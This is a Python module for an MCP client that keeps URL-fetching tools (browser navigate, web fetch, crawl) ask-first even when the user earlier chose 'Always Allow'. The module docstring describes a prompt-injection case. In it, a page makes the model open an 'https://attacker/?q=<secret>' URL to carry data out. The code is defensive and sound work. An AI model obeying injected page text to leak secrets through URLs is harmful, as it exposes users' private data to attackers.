"""MCP tools that always ask before running, whatever the trusted list says.

A tool that fetches a URL the model chose (a browser ``navigate``, a web
fetch, extract or crawl) can carry data out of the conversation: a prompt
injection in one page can have the model open ``https://attacker/?q=<secret>``.
Those tools stay ask-first even when "Always Allow" was clicked before; the
stored list is left alone and simply not honoured for them.
"""

from __future__ import annotations

from collections.abc import Iterable

# Tools known to take a URL (Browserbase, Exa, Tavily), plus name patterns
# for other servers. Browserbase's own ``extract``/``observe`` read the page
# already open, so they are not listed: opening it is what asks.
_ALWAYS_ASK_EXACT = frozenset(
    {
        "navigate",
        "goto",
        "open_url",
        "web_fetch_exa",
        "crawling_exa",
        "tavily_extract",
        "tavily_crawl",
        "tavily_map",
    }
)
_ALWAYS_ASK_PARTS = ("fetch", "crawl", "navigate", "scrape", "browse")


def always_asks(tool_name: str) -> bool:
    name = (tool_name or "").lower()
    if name in _ALWAYS_ASK_EXACT:
        return True
    return any(part in name for part in _ALWAYS_ASK_PARTS)


def effective_trusted(trusted: Iterable[str] | None) -> list[str]:
    return [t for t in (trusted or []) if isinstance(t, str) and not always_asks(t)]
